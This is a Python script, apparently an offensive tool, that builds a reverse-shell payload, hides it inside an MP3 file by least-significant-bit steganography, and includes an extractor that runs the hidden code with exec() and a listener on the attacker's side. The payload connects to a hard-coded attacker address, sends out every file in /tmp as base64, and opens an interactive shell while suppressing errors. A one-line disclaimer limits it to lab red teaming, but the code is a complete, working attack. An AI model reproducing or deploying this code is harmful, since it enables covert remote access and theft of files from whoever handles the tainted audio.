import os
import socket
import struct
import glob
import base64

print("LSB MP3 Steganography with Reverse Shell and Data Exfiltration")
print("Author: Taylor Christian Newsome")
print("Warning: For authorized red teaming in lab environments only.")

# Reverse shell payload with data exfiltration
def generate_reverse_shell(ip, port, exfil_dir="/tmp"):
    """Generate a Python reverse shell payload with data exfiltration."""
    return f"""
import socket
import os
import subprocess
import glob
import base64

def exfiltrate_data(s, directory):
    try:
        files = glob.glob(f"{{directory}}/*")
        for file in files:
            if os.path.isfile(file):
                with open(file, 'rb') as f:
                    data = f.read()
                    encoded_data = base64.b64encode(data).decode('utf-8')
                    s.send(f"FILE:{{file}}\\n".encode('utf-8'))
                    s.send(encoded_data.encode('utf-8') + b"\\n")
    except Exception:
        pass

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('{ip}', {port}))
    os.dup2(s.fileno(), 0)  # stdin
    os.dup2(s.fileno(), 1)  # stdout
    os.dup2(s.fileno(), 2)  # stderr
    exfiltrate_data(s, '{exfil_dir}')
    subprocess.call(['/bin/sh', '-i'], stderr=subprocess.STDOUT)
except Exception:
    pass  # Silent failure
"""

# Function to embed the payload into the MP3 file using LSB
def embed_payload(mp3_file, payload, output_file):
    """Embed a payload into an MP3 file using LSB steganography."""
    try:
        if not os.path.exists(mp3_file):
            raise FileNotFoundError(f"Input MP3 file '{mp3_file}' not found.")
        
        with open(mp3_file, 'rb') as f:
            mp3_data = bytearray(f.read())

        payload_bytes = payload.encode('utf-8')
        payload_length = len(payload_bytes)

        if payload_length * 8 + 32 > len(mp3_data):
            raise ValueError(f"Payload ({payload_length} bytes) too large for MP3 ({len(mp3_data)} bytes).")

        # Embed payload length (4 bytes)
        length_bytes = struct.pack('<I', payload_length)
        for i in range(4):
            for bit in range(8):
                mp3_data[i * 8 + bit] = (mp3_data[i * 8 + bit] & 0xFE) | ((length_bytes[i] >> (7 - bit)) & 0x01)

        # Embed payload
        for i in range(payload_length):
            byte = payload_bytes[i]
            for bit in range(8):
                index = (i + 4) * 8 + bit
                mp3_data[index] = (mp3_data[index] & 0xFE) | ((byte >> (7 - bit)) & 0x01)

        os.makedirs(os.path.dirname(output_file) or '.', exist_ok=True)
        with open(output_file, 'wb') as f:
            f.write(mp3_data)

        print(f"Payload embedded into '{output_file}'.")
    except Exception as e:
        print(f"Error embedding payload: {e}")
        raise

# Function to extract the payload from the MP3 file
def extract_payload(mp3_file):
    """Extract a payload from an MP3 file."""
    try:
        if not os.path.exists(mp3_file):
            raise FileNotFoundError(f"MP3 file '{mp3_file}' not found.")

        with open(mp3_file, 'rb') as f:
            mp3_data = bytearray(f.read())

        # Extract payload length
        length_bytes = 0
        for i in range(4):
            byte = 0
            for bit in range(8):
                byte = (byte << 1) | (mp3_data[i * 8 + bit] & 0x01)
            length_bytes = (length_bytes << 8) | byte
        if length_bytes * 8 + 32 > len(mp3_data):
            raise ValueError("Invalid payload length or corrupted MP3 file.")

        # Extract payload
        payload = bytearray()
        for i in range(length_bytes):
            byte = 0
            for bit in range(8):
                index = (i + 4) * 8 + bit
                byte = (byte << 1) | (mp3_data[index] & 0x01)
            payload.append(byte)

        return payload.decode('utf-8', errors='ignore')
    except Exception as e:
        print(f"Error extracting payload: {e}")
        raise

# Function to execute the extracted payload
def execute_payload(payload):
    """Execute the extracted payload (use with caution)."""
    try:
        exec(payload)
    except Exception as e:
        print(f"Error executing payload: {e}")

# Listener to receive exfiltrated data
def start_listener(ip, port):
    """Start a listener to receive exfiltrated data and shell."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((ip, port))
        s.listen(1)
        print(f"Listening on {ip}:{port}...")
        conn, addr = s.accept()
        print(f"Connected by {addr}")

        current_file = None
        with open("exfiltrated_data.txt", "wb") as f:
            while True:
                data = conn.recv(1024).decode('utf-8')
                if not data:
                    break
                if data.startswith("FILE:"):
                    current_file = data.split(":", 1)[1].strip()
                    print(f"Receiving file: {current_file}")
                elif current_file:
                    decoded_data = base64.b64decode(data)
                    f.write(f"FILE: {current_file}\n".encode('utf-8'))
                    f.write(decoded_data + b"\n")
                    current_file = None
        conn.close()
    except Exception as e:
        print(f"Listener error: {e}")

# Main function
def main():
    """Main function for MP3 steganography and reverse shell."""
    try:
        target_ip = "192.168.1.10"  # Attacker's IP
        target_port = 4444  # Attacker's port
        exfil_dir = "/tmp"  # Directory to exfiltrate

        # Validate IP and port
        socket.inet_aton(target_ip)
        if not (1 <= target_port <= 65535):
            raise ValueError(f"Invalid port: {target_port}")

        # Generate payload
        payload = generate_reverse_shell(target_ip, target_port, exfil_dir)

        # Embed payload
        input_mp3 = 'input.mp3'  # Change to your input MP3
        output_mp3 = 'output.mp3'  # Output MP3 with payload
        embed_payload(input_mp3, payload, output_mp3)

        # Start listener (run separately on attacker machine)
        # start_listener(target_ip, target_port)

        print("Operation completed. Run listener separately to receive data.")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
